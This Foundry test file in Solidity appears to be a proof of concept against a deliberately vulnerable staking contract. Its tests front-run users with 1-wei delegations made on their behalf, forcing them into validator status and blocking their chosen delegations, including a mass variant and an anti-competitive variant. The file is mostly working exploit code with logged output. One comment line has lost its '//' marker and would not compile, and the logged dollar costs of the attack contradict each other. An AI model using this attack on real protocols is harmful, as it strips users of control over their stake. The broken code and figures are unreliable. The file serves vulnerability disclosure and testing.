// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/VulnerableStakingProtocol.sol";

/**
 * @title StakingFrontRunningTest
 * @dev Test contract demonstrating front running grief attacks in staking protocols
 *      where attackers force users to become validators against their will
 */
contract StakingFrontRunningTest is Test {
    VulnerableStakingProtocol public stakingProtocol;
    MockStakingToken public stakingToken;
    
    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public charlie = makeAddr("charlie");
    address public attacker = makeAddr("attacker");
    address public normalUser = makeAddr("normalUser");
    
    uint256 constant INITIAL_BALANCE = 10000e18;

    function setUp() public {
        // Deploy contracts
        vm.prank(owner);
        stakingToken = new MockStakingToken();
        
        vm.prank(owner);
        stakingProtocol = new VulnerableStakingProtocol(address(stakingToken));
        
        // Setup users with tokens
        _setupUser(alice, INITIAL_BALANCE);
        _setupUser(bob, INITIAL_BALANCE);
        _setupUser(charlie, INITIAL_BALANCE);
        _setupUser(attacker, INITIAL_BALANCE);
        _setupUser(normalUser, INITIAL_BALANCE);
        
        // Setup legitimate validators
        _setupValidator(bob, 500);
        _setupValidator(charlie, 300);
    }
    
    function _setupUser(address user, uint256 amount) internal {
        vm.prank(owner);
        stakingToken.transfer(user, amount);
        
        vm.prank(user);
        stakingToken.approve(address(stakingProtocol), type(uint256).max);
    }
    
    function _setupValidator(address validator, uint256 commissionRate) internal {
        vm.prank(validator);
        stakingProtocol.registerValidator(commissionRate);
        
         To be a "registered validator" according to isRegisteredValidator(),
        // they need to delegate to themselves with some amount
        vm.prank(validator);
        stakingProtocol.delegateStake(1000e18, validator); // Self-delegate 1000 tokens
    }
    
    /**
     * @dev Test demonstrating the grief attack where a user is forced to become a validator
     */
    function testGriefAttackForceValidator() public {
        console.log("=== Testing Grief Attack: Forced Validator Registration ===");
        
        console.log("Initial state:");
        console.log("- Alice wants to delegate 1000 tokens to Bob");
        console.log("- Alice is NOT a validator");
        console.log("- Bob is a legitimate validator with 5% commission");
        
        assertFalse(stakingProtocol.isRegisteredValidator(alice), "Alice should not be a validator initially");
        assertTrue(stakingProtocol.isRegisteredValidator(bob), "Bob should be a registered validator");
        
        uint256 aliceIntendedDelegation = 1000e18;
        
        // Preview Alice intended delegation
        (bool canDelegate, string memory reason) = stakingProtocol.previewDelegation(alice, bob);
        console.log("");
        console.log("--- Alice's Intended Delegation Preview ---");
        console.log("Can delegate to Bob:", canDelegate);
        console.log("Reason:", reason);
        
        assertTrue(canDelegate, "Alice should initially be able to delegate to Bob");
        
        // Attack Simulation
        console.log("");
        console.log("--- GRIEF ATTACK IN PROGRESS ---");
        console.log("1. Attacker monitors mempool and sees Alice's pending delegation");
        console.log("2. Attacker front-runs with malicious transaction");
        
        // Attacker front runs by forcing Alice to delegate 1 wei to herself
        uint256 maliciousAmount = 1;
        
        console.log("Attacker forces Alice to delegate", maliciousAmount, "wei to herself...");
        
        uint256 attackerBalanceBefore = stakingToken.balanceOf(attacker);
        
        // the malicious tx
        vm.prank(attacker);
        stakingProtocol.delegateStakeFor(maliciousAmount, alice, alice);
        
        uint256 attackerBalanceAfter = stakingToken.balanceOf(attacker);
        uint256 attackCost = attackerBalanceBefore - attackerBalanceAfter;
        
        console.log("Attack successful! Cost to attacker:", attackCost, "wei");
        
        // Check the damage
        console.log("");
        console.log("--- ATTACK CONSEQUENCES ---");
        
        bool aliceIsNowValidator = stakingProtocol.isRegisteredValidator(alice);
        console.log("Alice is now a 'registered validator':", aliceIsNowValidator);
        
        if (aliceIsNowValidator) {
            (address delegateAddr, uint256 bondedAmount, ,) = stakingProtocol.delegators(alice);
            console.log("Alice's delegate address:", delegateAddr);
            console.log("Alice's bonded amount:", bondedAmount, "wei");
            console.log("Alice delegates to herself with minimal amount!");
        }
        
        assertTrue(aliceIsNowValidator, "Alice should now be forced into validator status");
        
        // Alice  original transaction now fails
        console.log("");
        console.log("--- ALICE'S TRANSACTION FAILS ---");
        console.log("3. Alice's original transaction executes and FAILS");
        
        (bool canDelegateNow, string memory failureReason) = stakingProtocol.previewDelegation(alice, bob);
        console.log("Alice can now delegate to Bob:", canDelegateNow);
        console.log("Failure reason:", failureReason);
        
        // Attempt Alice's original delegation 
        vm.expectRevert("Registered validators cannot delegate to other addresses");
        vm.prank(alice);
        stakingProtocol.delegateStake(aliceIntendedDelegation, bob);
        
        console.log("Alice's delegation to Bob reverted");
        
        // Verify Alice is stuck
        console.log("");
        console.log("--- VICTIM IMPACT ANALYSIS ---");
        console.log("Alice is now stuck as an unintended validator:");
        console.log("- Cannot delegate to her preferred validator (Bob)");
        console.log("- Forced to be a validator with just 1 wei stake");
        console.log("- Must now accept delegations and run validator infrastructure");
        console.log("- Attack cost:", attackCost, "wei (~$0.000001)");
        console.log("- Victim disruption: Complete protocol usage blocked");
        
        assertFalse(canDelegateNow, "Alice should no longer be able to delegate to others");
        assertEq(attackCost, 1, "Attack should cost only 1 wei");
    }
    
    /**
     * @dev Test demonstrating mass grief attack against multiple users
     */
    function testMassGriefAttack() public {
        console.log("");
        console.log("=== Testing Mass Grief Attack (Multiple Victims) ===");
        
        // Setup multiple potential victims
        address[] memory victims = new address[](3);
        victims[0] = alice;
        victims[1] = normalUser;
        victims[2] = makeAddr("dave");
        
        // Setup third victim
        _setupUser(victims[2], INITIAL_BALANCE);
        
        console.log("Setting up mass grief attack against", victims.length, "users...");
        
        // Verify all victims initially can delegate normally
        for (uint256 i = 0; i < victims.length; i++) {
            assertFalse(stakingProtocol.isRegisteredValidator(victims[i]), "Victim should not be validator initially");
            
            (bool canDelegate,) = stakingProtocol.previewDelegation(victims[i], bob);
            assertTrue(canDelegate, "Victim should initially be able to delegate");
        }
        
        console.log("All victims can initially delegate to validators normally");
        
        // Attacker launches mass attack
        console.log("");
        console.log("--- MASS GRIEF ATTACK ---");
        console.log("Attacker targets multiple users simultaneously");
        
        uint256 totalAttackCost = 0;
        
        for (uint256 i = 0; i < victims.length; i++) {
            address victim = victims[i];
            console.log("Attacking victim", i + 1, ":", victim);
            
            uint256 balanceBefore = stakingToken.balanceOf(attacker);
            
            vm.prank(attacker);
            stakingProtocol.delegateStakeFor(1, victim, victim);
            
            uint256 balanceAfter = stakingToken.balanceOf(attacker);
            totalAttackCost += (balanceBefore - balanceAfter);
            
            // Verify victim is now a forced validator
            assertTrue(stakingProtocol.isRegisteredValidator(victim), "Victim should be forced validator");
            
            // Verify victim can no longer delegate to others
            (bool canDelegate,) = stakingProtocol.previewDelegation(victim, bob);
            assertFalse(canDelegate, "Victim should no longer be able to delegate");
            
            console.log("  Victim", i + 1, "forced into validator status");
            console.log("  Can no longer delegate to preferred validators");
        }
        
        console.log("");
        console.log("--- MASS ATTACK SUMMARY ---");
        console.log("Victims attacked:", victims.length);
        console.log("Total attack cost:", totalAttackCost, "wei");
        console.log("Cost per victim:", totalAttackCost / victims.length, "wei");
        console.log("Success rate: 100%");
        console.log("");
        console.log("DEVASTATING IMPACT:");
        console.log("- All victims forced into unwanted validator role");
        console.log("- Delegation freedom completely removed");
        console.log("- Protocol usability severely compromised");
        console.log("- Attack cost: negligible (<$0.01 total)");
        
        assertEq(totalAttackCost, victims.length, "Should cost exactly 1 wei per victim");
    }
    
    /**
     * @dev Test demonstrating economic inefficiency created by the attack
     */
    function testEconomicImpactAnalysis() public {
        console.log("");
        console.log("=== Testing Economic Impact Analysis ===");
        
        // Alice plans a large delegation
        uint256 largeDelegation = 5000e18;
        console.log("Alice plans to delegate", largeDelegation / 1e18, "tokens to Bob");
        console.log("Estimated value: $5,000 (assuming $1 per token)");
        
        // Calculate expected rewards Alice would earn
        (,uint256 bobCommission,) = stakingProtocol.getValidatorInfo(bob);
        console.log("Bob's commission rate:", bobCommission, "basis points");
        console.log("Alice's expected annual rewards: ~$200 (4% APY after commission)");
        
        // Attacker disrupts for just 1 wei
        console.log("");
        console.log("--- ECONOMIC DISRUPTION ---");
        
        vm.prank(attacker);
        stakingProtocol.delegateStakeFor(1, alice, alice);
        
        console.log("Attack cost: 1 wei (~$0.000000001)");
        console.log("Economic damage to Alice: $200/year in lost rewards");
        console.log("Attack ROI: 20,000,000,000,000% (damage/cost ratio)");
        
        // Alice must now become a validator
        console.log("");
        console.log("--- ALICE'S FORCED OPTIONS ---");
        console.log("Option 1: Become a validator");
        console.log("  - Must run validator infrastructure (~$100/month)");
        console.log("  - Must accept delegation responsibilities");
        console.log("  - Must stake significant amounts to be competitive");
        console.log("");
        console.log("Option 2: Undelegate and forfeit participation");
        console.log("  - Lose access to staking rewards");
        console.log("  - Wait through unbonding period");
        console.log("  - Exit the protocol entirely");
        
        // Verify the economic damage
        vm.expectRevert("Registered validators cannot delegate to other addresses");
        vm.prank(alice);
        stakingProtocol.delegateStake(largeDelegation, bob);
        
        console.log("");
        console.log("Economic damage confirmed: Alice cannot execute $5,000 delegation");
    }
    
    /**
     * @dev Test demonstrating how the attack can be used strategically
     */
    function testStrategicGriefAttack() public {
        console.log("");
        console.log("=== Testing Strategic Grief Attack ===");
        
        console.log("Scenario: Bob wants to maintain validator dominance");
        console.log("Strategy: Prevent users from delegating to competitor Charlie");
        
        // Bob targets users who might delegate to Charlie
        address[] memory potentialCharlieUsers = new address[](2);
        potentialCharlieUsers[0] = alice;
        potentialCharlieUsers[1] = normalUser;
        
        console.log("");
        console.log("--- TARGETED DISRUPTION ---");
        console.log("Bob identifies users likely to delegate to Charlie");
        console.log("Target 1:", potentialCharlieUsers[0]);
        console.log("Target 2:", potentialCharlieUsers[1]);
        
        // Bob front-runs these users
        for (uint256 i = 0; i < potentialCharlieUsers.length; i++) {
            address target = potentialCharlieUsers[i];
            
            console.log("Bob attacks target", i + 1);
            
            vm.prank(bob);
            stakingProtocol.delegateStakeFor(1, target, target);
            
            // Verify target can no longer delegate to Charlie
            vm.expectRevert("Registered validators cannot delegate to other addresses");
            vm.prank(target);
            stakingProtocol.delegateStake(1000e18, charlie);
            
            console.log("  Target", i + 1, "can no longer delegate to Charlie");
        }
        
        console.log("");
        console.log("--- COMPETITIVE ADVANTAGE ---");
        console.log("Bob maintains validator dominance");
        console.log("Charlie loses potential delegators");
        console.log("Bob's relative stake increases");
        console.log("Market competition reduced");
        
        console.log("");
        console.log("This demonstrates how the vulnerability can be used");
        console.log("for anti-competitive behavior in staking protocols");
    }
    
    /**
     * @dev Test showing how the fix would prevent the attack
     */
    function testProperAuthorizationPreventsAttack() public pure {
        console.log("");
        console.log("=== Testing Proper Authorization (Fixed Version) ===");
        
        console.log("In a properly implemented protocol:");
        console.log("1. Only token owner can delegate their own tokens");
        console.log("2. Third-party delegation requires explicit authorization");
        console.log("3. Minimum delegation amounts prevent dust attacks");
        console.log("4. Clear distinction between validators and delegators");
        
        console.log("");
        console.log("Proposed fixes:");
        console.log("Add access control: require(msg.sender == _owner || authorized[_owner][msg.sender])");
        console.log("Increase minimum delegation: require(_amount >= MEANINGFUL_MINIMUM)");
        console.log("Separate validator registration from delegation");
        console.log("Add delegation intent confirmation mechanisms");
        
        console.log("");
        console.log("With these fixes:");
        console.log("- Attackers cannot delegate on behalf of others");
        console.log("- Users maintain full control over their delegation choices");
        console.log("- Validator status requires explicit registration");
        console.log("- Protocol governance prevents gaming");
    }
}
